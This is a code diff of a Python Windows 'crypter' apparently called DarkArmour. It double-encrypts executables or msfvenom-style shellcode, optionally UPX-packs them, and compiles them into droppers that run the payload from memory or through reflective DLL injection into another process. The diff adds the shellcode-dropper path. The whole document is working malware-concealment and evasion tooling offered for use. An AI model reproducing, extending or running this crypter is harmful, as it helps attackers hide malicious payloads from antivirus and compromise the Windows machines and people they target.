@@ -6,7 +6,7 @@ import random
 import string
 import argparse
 
-version     = "0.1"
+version     = "0.2"
 FILETYPE    = None
 PE_IMAGE    = None
 OUT_NAME    = None
@@ -14,9 +14,10 @@ CRYPTKEY1   = None
 CRYPTKEY2   = None
 BINASRAW    = False
 NULLBKEY    = None
-UPXPACK     = False
+UPXPACK     = True
 RUNASDLL    = False
 DLLIMAGE    = None
+SCDLL       = False
 
 """
 sudo apt install osslsigncode
@@ -79,17 +80,21 @@ def write_pe_image():
     with open("lib/pe_image.h", "w") as file:
         file.write(PE_IMAGE)
 
-def write_header_file():
+def write_header_file(keys=True):
+    HEADFILE = ""
     with open("lib/main.h", "w") as file:
-        HEADFILE =   f"#define key_one {hex(CRYPTKEY1)}\n"
-        HEADFILE +=  f"#define key_two {hex(CRYPTKEY2)}\n"
-        HEADFILE +=  f"#define null_key {hex(NULLBKEY)}\n"
+        if keys:
+            HEADFILE +=  f"#define key_one {hex(CRYPTKEY1)}\n"
+            HEADFILE +=  f"#define key_two {hex(CRYPTKEY2)}\n"
+            HEADFILE +=  f"#define null_key {hex(NULLBKEY)}\n"
         HEADFILE +=  "void RunFromMemory(char* pImage, char* pPath);"
         file.write(HEADFILE)
 
-def compile_as_binary():
-    global OUT_NAME
-    os.system(f"i686-w64-mingw32-g++ lib/exec_memory.cpp lib/pe_main.cpp -o {OUT_NAME} -static")
+def compile_as_binary(outname, source, source2=None):
+    if source2 is not None:
+        os.system(f"i686-w64-mingw32-g++ {source} {source2} -o {outname} -static")
+    else:
+        os.system(f"i686-w64-mingw32-g++ {source} -o {outname} -static")
 
 def strip_bin(infile):
     os.system(f"strip {infile} > /dev/null")
@@ -106,10 +111,13 @@ def pack_with_upx(file):
     print(f"[+] Packed {file} with upx, stored it in {name}")
     return name
 
-def compile_as_dll():
+def compile_as_dll(source1, source2=None):
     file = gen_rand_filename() + ".dll"
     reflect = "lib/ReflectiveDLLInjection/dll/"
-    cmd = f"i686-w64-mingw32-g++ lib/dll_main.c {reflect}ReflectiveLoader.c lib/exec_memory.cpp -o {file} -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN -DWIN_X86 -shared -static -w"
+    if source2 is not None:
+        cmd = f"i686-w64-mingw32-g++ {source1} {reflect}ReflectiveLoader.c {source2} -o {file} -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN -DWIN_X86 -shared -static -w"
+    if source2 is None:
+         cmd = f"i686-w64-mingw32-g++ {source1} {reflect}ReflectiveLoader.c -o {file} -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN -DWIN_X86 -shared -static -w"
     os.system(cmd)
     return file
 
@@ -124,30 +132,18 @@ def prepare_dll_image(bytes_len, hex_bytes):
     DLLIMAGE += hex_bytes
     DLLIMAGE += "\n};"
 
-def compile_dll_loader_as_pe():
-    global OUT_NAME
+def compile_dll_loader_as_pe(out_name, sourcefile):
     reflect_inject = "lib/ReflectiveDLLInjection/inject/"
     sources = f"{reflect_inject}GetProcAddressR.c {reflect_inject}LoadLibraryR.c"
     flags = "-O2 -DWIN_X86 -static -lwtsapi32 -w"
 
-    cmd = f"i686-w64-mingw32-gcc {sources} lib/dll_mem_exec.c -o {OUT_NAME} {flags}"
+    cmd = f"i686-w64-mingw32-gcc {sources} {sourcefile} -o {OUT_NAME} {flags}"
     os.system(cmd)
 
 def clean_file(file):
     os.unlink(file)
 
-def crypt(infile):
-    print(f"[+] Starting to crypt {infile} ({get_size(infile)} bytes)")
-
-    if UPXPACK:
-        infile = pack_with_upx(infile)
-    else:
-        length = strip_bin(infile)
-        print(f"[+] Stripped {infile} down to {length} bytes")
-
-    gen_null_key()
-    hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY1, infile=infile)
-
+def clean_hex_output(hex_bytes):
     raw_crypt_bytes = b""
     for byte in hex_bytes.split():
         byte = byte.replace("0x", '')
@@ -158,36 +154,95 @@ def crypt(infile):
             raw_crypt_bytes += bytes.fromhex(byte).encode('utf-8')
         except AttributeError:
             raw_crypt_bytes += bytes.fromhex(byte)
+    return raw_crypt_bytes
 
-    hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY2, infile=None, data=raw_crypt_bytes, data_length=bytes_len)
-    prepare_pe_image(bytes_len, hex_bytes)
-    write_pe_image()
-    print("[+] Extracted bytes and created pe image")
-    write_header_file()
 
-    if RUNASDLL is False:
-        compile_as_binary()
-        if UPXPACK is True:
-            clean_file(infile)
-        print(f"[*] Wrote {get_size(OUT_NAME)} bytes to PE {OUT_NAME}")
-    elif RUNASDLL is True:
-        dll_file = compile_as_dll()
-        print(f"[+] Wrote {get_size(dll_file)} bytes to DLL {dll_file}")
-        hex_bytes, bytes_len = get_file_as_hex(dll_file, False, None)
-        prepare_dll_image(bytes_len, hex_bytes)
-        write_dll_image()
-        compile_dll_loader_as_pe()
-        print(f"[*] Compiled the dll loader and wrote {get_size(OUT_NAME)} bytes to {OUT_NAME}")
+def gen_shellcode_template(filename, hex_bytes, bytes_len):
+    sc_template  = ""
+    sc_template += f"#define array_len {bytes_len}\n"
+    sc_template += "unsigned char shellcode[] = {\n"
+    sc_template += hex_bytes
+    sc_template += "};\n"
+    with open(filename, "w") as file:
+        file.write(sc_template)
 
+
+def crypt(infile, shellcode=False, clean=False):
+    if clean: file_to_clean = infile
+    if shellcode == False:
+        print(f"[+] Starting to crypt {infile} ({get_size(infile)} bytes)")
+
+        if UPXPACK:
+            infile = pack_with_upx(infile)
+        else:
+            length = strip_bin(infile)
+            print(f"[+] Stripped {infile} down to {length} bytes")
+
+        gen_null_key()
+        if CRYPTKEY1 is None: gen_rand_key()
+        hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY1, infile=infile)
+
+        raw_crypt_bytes = clean_hex_output(hex_bytes)
+
+        hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY2, infile=None, data=raw_crypt_bytes, data_length=bytes_len)
+        prepare_pe_image(bytes_len, hex_bytes)
+        write_pe_image()
+        print("[+] Extracted bytes and created pe image")
+        write_header_file()
+
+        if RUNASDLL is False:
+            compile_as_binary(OUT_NAME, "lib/exec_memory.cpp", source2="lib/pe_main.cpp")
+            if UPXPACK is True:
+                clean_file(infile)
+            if clean: clean_file(file_to_clean)
+            print(f"[*] Wrote {get_size(OUT_NAME)} bytes to PE {OUT_NAME}")
+        elif RUNASDLL is True:
+            dll_file = compile_as_dll("lib/dll_main.c", "lib/exec_memory.cpp")
+            print(f"[+] Wrote {get_size(dll_file)} bytes to DLL {dll_file}")
+            hex_bytes, bytes_len = get_file_as_hex(False, None, infile=dll_file)
+            prepare_dll_image(bytes_len, hex_bytes)
+            write_dll_image()
+            compile_dll_loader_as_pe(OUT_NAME, "lib/dll_mem_exec.c")
+            print(f"[*] Compiled the dll loader and wrote {get_size(OUT_NAME)} bytes to {OUT_NAME}")
+    if shellcode:
+        if RUNASDLL is True:
+            gen_null_key()
+            if CRYPTKEY1 is None: gen_rand_key()
+            write_header_file()
+            hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY1, infile=infile)
+            raw_crypt_bytes = clean_hex_output(hex_bytes)
+            hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY2, infile=None, data=raw_crypt_bytes, data_length=bytes_len)
+
+            gen_shellcode_template("lib/shellcode_template.h", hex_bytes, bytes_len)
+            dll_file = compile_as_dll("lib/dll_shellcode_dropper.c")
+            print(f"[+] Wrote {get_size(dll_file)} bytes to DLL {dll_file}")
+            hex_bytes, bytes_len = get_file_as_hex(False, None, infile=dll_file)
+            prepare_dll_image(bytes_len, hex_bytes)
+            write_dll_image()
+            compile_dll_loader_as_pe(OUT_NAME, "lib/dll_mem_exec.c")
+            clean_file(dll_file)
+            print(f"[*] Compiled the dll injecting shellcode dropper and wrote {get_size(OUT_NAME)} bytes to {OUT_NAME}")
+        else:
+            if CRYPTKEY1 is None: gen_rand_key()
+            gen_null_key()
+            write_header_file()
+            hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY1, infile=infile)
+            print(f"[+] Extracted shellcode from {infile} ({bytes_len} bytes)")
+            gen_shellcode_template("lib/shellcode_template.h", hex_bytes, bytes_len)
+            print(f"[+] Created dropper template")
+            temp_out_name = gen_rand_filename() + ".exe"
+            compile_as_binary(temp_out_name, "lib/shellcode_dropper.c")
+            print(f"[+] Compiled shellcode dropper and wrote {get_size(temp_out_name)} bytes to {temp_out_name}")
+            crypt(temp_out_name, clean=True)
 
 
 if __name__ == '__main__':
     ap = argparse.ArgumentParser()
 
-    print(f"Windows crypter by Dylan Halls (v{version})\n")
+    print(f"DarkArmour by Dylan Halls (v{version})\n")
 
-    ap.add_argument("file", help="file to crypt, assumed as binary if not told otherwise")
-    ap.add_argument("-u", "--upx", required=False, action='store_true', help="upx file before crypting")
+    ap.add_argument("-f", "--file", required=False, help="file to crypt, assumed as binary if not told otherwise")
+    ap.add_argument("-S", "--shellcode", required=False, help="file contating the shellcode, needs to be in the 'msfvenom -f raw' style format")
     ap.add_argument("-b", "--binary", required=False, action='store_true', help="provide if file is a binary exe")
     ap.add_argument("-d", "--dll", required=False, action='store_true', help="use reflective dll injection to execute the binary inside another process")
     ap.add_argument("-s", "--source", required=False, action='store_true', help="provide if the file is c source code")
@@ -210,11 +265,11 @@ if __name__ == '__main__':
 
     if args['key'] is not None:
         CRYPTKEY1 = hex(args['key'])
-    else:
-        gen_rand_key()
 
     if args['raw'] is not False: BINASRAW = True
-    if args['upx'] is not False: UPXPACK = True
     if args['dll'] is not False: RUNASDLL = True
 
-    crypt(args['file'])
+    if args["shellcode"] is not None:
+        crypt(args["shellcode"], shellcode=True)
+    else:
+        crypt(args["file"])
